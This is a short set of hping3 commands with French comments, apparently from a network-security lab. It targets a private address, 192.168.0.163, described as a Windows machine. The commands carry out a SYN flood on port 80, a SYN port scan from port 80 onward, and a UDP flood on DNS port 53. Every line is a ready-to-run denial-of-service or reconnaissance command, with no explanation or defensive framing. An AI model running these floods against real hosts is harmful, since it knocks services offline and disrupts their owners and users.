# SYN flood vers port 80 de Windows
sudo hping3 -S 192.168.0.163 -p 80 --flood

# Reconnaissance : scan SYN sur ports 80 à 85
sudo hping3 -S 192.168.0.163 -p ++80 -c 100

# UDP flood vers port 53 (DNS)
sudo hping3 --udp -p 53 192.168.0.163 --flood
